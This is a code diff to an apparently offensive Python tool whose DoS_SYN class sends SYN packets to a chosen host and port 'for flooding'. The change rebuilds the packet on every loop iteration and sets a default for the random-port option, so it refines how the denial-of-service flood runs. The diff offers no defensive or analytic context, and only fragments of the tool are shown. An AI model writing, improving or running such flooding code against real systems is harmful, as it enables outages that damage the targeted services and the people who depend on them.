@@ -1407,7 +1407,6 @@ class DoS_SYN :
         return
 
     def __flood(self) -> None :
-        payload = self.package()
         print("starting timer...", end = " ", flush = True)
         start_time = Constant.TIME()
         print(Constant.GREEN("DONE"))
@@ -1418,6 +1417,7 @@ class DoS_SYN :
             print(Constant.GREEN("DONE"))
             print("flooding started...")
             while (self.counter != self.count) :
+                payload = self.package()
                 flood.sendto(payload, (self.host, self.port))
                 flood.shutdown(socket.SHUT_RD)
                 self.counter += 1
@@ -1726,7 +1726,7 @@ if not Constant.MODULE :
         syn_tool.add_argument("-x", "--host", type = str, required = True, help = "sets host for flooding")
         syn_tool.add_argument("-p", "--port", type = int, help = "sets port for flooding", default = 80)
         syn_tool.add_argument("-n", "--number", type = int, required = True, help = "sets number of packets")
-        syn_tool.add_argument("-r", "--random-port", action = "store_true", help = "enables random ports")
+        syn_tool.add_argument("-r", "--random-port", action = "store_true", help = "enables random ports", default = False)
         syn_tool.add_argument("-w", "--wait", type = float, help = "sets time.sleep after each segment", default = 0.0)
         syn_tool.set_defaults(func = DoS_SYN_args)
         http_tool = subparser.add_parser("http", help = "execute http request")
